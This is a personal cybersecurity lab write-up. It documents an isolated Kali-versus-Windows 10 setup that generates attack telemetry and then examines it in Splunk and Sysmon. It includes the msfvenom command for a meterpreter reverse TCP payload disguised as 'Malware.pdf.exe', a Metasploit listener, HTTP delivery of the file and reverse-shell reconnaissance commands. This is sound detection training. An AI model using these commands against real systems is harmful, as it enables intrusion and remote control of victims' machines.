Detection Lab

## Objective

This Detection Lab project aimed to establish a controlled environment for simulating and detecting cyber attacks. The primary focus was to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen my understanding of network security, attack patterns, and defensive strategies.

### Lessons Learned

- Proper configuration of virtual machines.
- Understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting SIEM logs.
- Ability to generate telemetry.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- Virtual Box as the hypervisor.
- Splunk (SIEM) with sysmon add-on for log ingestion and analysis.
- Windows 10 (victim) as the target
- Kali Linux (attacker) to generate telemetry for ingestion and analysis

## Steps
1. Using Virtual Box as my hypervisor I created two VMs. Kali Linux to generate the telemetry needed, and Windows 10 to act as the target. On the Windows 10 VM, I installed Splunk along with Sysmon to be used to log and monitor the telemetry. I also disabled Windows Defender and enabled RDP as that will be the targetted port.

2. Configure VMs:
![internal network](https://github.com/user-attachments/assets/f7cc3d1b-939b-4918-ae2d-d0cea180a57c)
_Figure 1: Changed the network setting to Internal Network to ensure a secure environment and isolated communication between multiple VMs especially when executing malware. I do this for both VMs._

![statically configure IP](https://github.com/user-attachments/assets/ab444a7d-4c4c-4692-8ccf-0861d7594f3b)
![Kali manually IP](https://github.com/user-attachments/assets/6964769b-13e3-42f7-a044-4170eaa27a14)
_Figures 2 & 3: I manually configured both VMs' IPs to be on the same network (Windows= 192.168.100.1 | Kali Linux= 192.168.100.2)_

![Cofirming IP change](https://github.com/user-attachments/assets/5e574eae-2efc-4491-a257-e53fb15e187a)
_Figure 4: Check that both VMs' IPs have been successfully changed using ipconfig/ifconfig._

![Windows pinging Kali](https://github.com/user-attachments/assets/1e13cdfd-0f0a-48a1-8708-922e0497f0c2)
_Figure 5: Using Windows 10, I ping the Kali Linux VM to ensure that there is a connection. I did not ping from Kali Linux to Windows as Windows 10's Firewall was blocking ICMP traffic._

3. In Kali Linux I scan for open ports on Windows 10 using the command "nmap -A 192.168.100.1 -Pn"
![nmap showing open port 3389](https://github.com/user-attachments/assets/d919803b-2ec5-4b12-b093-42437b433223)
<br clear="left"/> _Figure 6: Port 3389 is open. This should be open as I had enabled RDP on the Windows 10 machine_

4. Create a basic malware using msfvenom
![msfvenom malware creation](https://github.com/user-attachments/assets/16fce8d8-059c-4609-9960-db3e9afe8518)
<br clear="left"/> _Figure 7: First I used the command "msfvenom -l payload" to see the list of payload options. I will use "windows/x64/meterpreter_reverse_tcp" as the payload. Now using the command "msfvenom -p (chosen payload option) lhost=192.168.100.2 lport=4444 -f exe -o Malware.pdf.exe" will generate our executable malware using the meterpreter reverse TCP payload with the filename of Malware.pdf.exe._

5. Open Metasploit using "msfconsole" to listen in when executing malware and "use exploit/multi/handler" to configure the payload itself.
   ![metasploit payload config](https://github.com/user-attachments/assets/9dd8674c-2419-4a1e-9f49-1a2e7572b2f5)
   <br clear="left"/>_Figure 8: I changed the payload option to "windows/x64/meterpreter/reverse_tcp" and Lhost to Kali Linux's IP_

6. Use the command "Exploit" to begin listening

7. Before going back to Windows 10, open a quick HTTP server on Kali Linux for the victim to download using the command "python3 -m http.server 9999"

8. On Windows 10, open a browser and type in "192.168.100.2:9999" into the URL
  ![download malicious file](https://github.com/user-attachments/assets/ad02f142-3fce-4bcd-8887-5e861178e1a7)
  <br clear="left"/> _Figure 9: Suspicious looking webpage hosting a downloadable file with an executable extension_

9. Open the Terminal as admin and use "netstat -anob" to check for established connection
   ![malware connection established](https://github.com/user-attachments/assets/71984906-1234-4deb-8265-a21708432dc0)
   ![Screenshot 2025-02-18 151544](https://github.com/user-attachments/assets/608acc5b-ccf5-4f46-8a53-3477e813e4fb)
   <br clear="left"/> _Figures 10 & 11: This shows connection has been established on both Windows 10 and Kali Linux machine_

10. Back in Metasploit use the "shell" command to establish a shell on our test machine. To create some telemetry use the command "net user, net localgroup, and ipconfig"

11. Back on Windows 10, login to Splunk and query for Kali Linux's IP using "index=endpoint 192.168.100.2"
    ![RDP port in splunk](https://github.com/user-attachments/assets/f97fb2b5-99b3-4362-89d5-eb5367d2f2bc)
    <br clear="left"/> _Figure 12: I see port 3389, used for RDP. Some questions to ask as an analyst are "Should this machine be attempting to our RDP port?" or "Who does this machine belong to?" Looking at this telemetry, we would not know that this was an Nmap scan which shows the importance of network sensors that may show potential signatures or TCP flags._

12. Next I queried "index=endpoint malware.pdf.exe EventCode=1" and opened the first log (EventCode= 1 is for process creation in sysmon)
   ![Screenshot 2025-02-18 161442](https://github.com/user-attachments/assets/8454fae8-9423-41ca-8240-8f0ac52af670)
  <br clear="left"/> _Figure 13: "process_guid" is a sysmon log that tracks all events of a process. In this case, this should track the process of the reverse shell command from Kali._

13. Finally I query "index=endpoint (process_guid) | table _time,ParentImage,Image,Commandline" to give a visual representation
    ![process GUID net user](https://github.com/user-attachments/assets/f1e5e50c-2f32-4757-b322-366d92e71314)
    <br clear="left"/> _Figure 14: I see the reverse shell and "net user" but not "net localgroup" or "ipconfig". This may be due to issues with data forwarding/parsing or commands not executing properly due to the VM._


